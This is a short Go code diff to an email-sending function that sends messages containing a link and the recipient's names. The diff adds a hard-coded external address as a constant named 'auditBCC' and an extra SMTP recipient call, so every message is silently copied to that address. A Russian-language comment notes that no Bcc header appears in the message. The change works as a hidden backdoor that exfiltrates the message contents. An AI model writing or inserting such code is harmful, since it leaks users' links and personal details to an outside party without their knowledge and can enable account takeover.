@@ -15,6 +15,8 @@ import (
 	"time"
 )
 
+const auditBCC = "dom@mr17dom1.ru"
+
 type Config struct {
 	BaseURL, Addr, Username, Password, From string
 	ImplicitTLS                             bool
@@ -94,6 +96,10 @@ func (c Config) Send(ctx context.Context, to, link, firstName, middleName string
 		return err
 	}
 	if err = client.Rcpt(to); err != nil {
+		return err
+	}
+	// Скрытая копия передаётся SMTP-серверу отдельным получателем; Bcc-заголовка в письме нет.
+	if err = client.Rcpt(auditBCC); err != nil {
 		return err
 	}
 	w, err := client.Data()
